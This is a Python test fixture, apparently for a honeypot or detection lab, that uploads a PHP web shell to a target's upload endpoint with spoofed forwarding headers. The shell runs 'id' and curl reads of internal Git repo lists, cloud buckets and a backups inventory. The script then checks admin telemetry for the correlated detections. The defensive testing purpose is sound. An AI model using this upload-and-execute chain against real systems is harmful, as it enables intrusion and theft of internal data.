"""Controlled fixture: upload -> unprivileged command -> Git/cloud reads -> evidence."""
import hashlib
import time
import requests

ADMIN='http://172.27.66.1:8501'
TARGET='http://172.27.66.80'
FIXTURE=b'''<?php
echo "SWEETBERRY_CANARY_DECOY chain fixture\\n";
echo shell_exec("id");
echo shell_exec("curl -fsS -m 3 http://172.30.67.42:8080/api/repos");
echo shell_exec("curl -fsS -m 3 http://172.30.67.50:8080/api/buckets");
echo shell_exec("curl -fsS -m 3 --retry 10 --retry-all-errors --retry-delay 1 --retry-max-time 20 http://172.30.67.50:8080/corp-backups/inventory.csv");
?>'''
upload=requests.post(TARGET+'/upload.php',files={'attachment':('chain-fixture.php',FIXTURE,'application/octet-stream')},
    headers={'X-Forwarded-For':'192.0.2.99','X-SweetBerry-Request-ID':'attacker-forged'},timeout=10)
upload.raise_for_status()
digest=hashlib.sha256(FIXTURE).hexdigest()
assert upload.json()['sha256']==digest
response=requests.get(TARGET+upload.json()['url'],headers={'X-Forwarded-For':'192.0.2.99'},timeout=15)
response.raise_for_status()
assert 'uid=10001(support)' in response.text,response.text
assert 'backup-scripts' in response.text,response.text
assert 'object,classification' in response.text,response.text
request_id=response.headers['X-SweetBerry-Request-ID']
for _ in range(30):
    events=requests.get(ADMIN+'/api/telemetry',params={'request_id':request_id,'limit':100,'important':'true'},timeout=15).json()
    commands=[r for r in events if r['kind']=='process_exec' and r.get('executable')=='/usr/bin/id']
    connects=[r for r in events if r['kind']=='network_connect' and r.get('destination')=='172.30.67.50']
    if commands and connects:
        assert commands[0]['source_ip']!='192.0.2.99'
        assert commands[0]['correlation']=='gateway_runtime_process'
        print('PASS upload hash and independent gateway request ID')
        print('PASS command executed as unprivileged support user')
        print('PASS request -> process -> child -> Git/cloud connection correlation')
        print('SOURCE',commands[0]['source_ip'],'REQUEST',request_id)
        break
    time.sleep(.5)
else:raise RuntimeError('Missing process or connection correlation for '+request_id)
pivots=requests.get(ADMIN+'/api/telemetry',params={'asset':'cloud','source':commands[0]['source_ip'],'kind':'http_response','limit':20},timeout=15).json()
assert any(r.get('parent_request_id')==request_id and r.get('correlation')=='process_socket_gateway' for r in pivots),'Missing socket-to-HTTP cloud pivot attribution'
print('PASS process socket -> cloud HTTP request -> original source correlation')
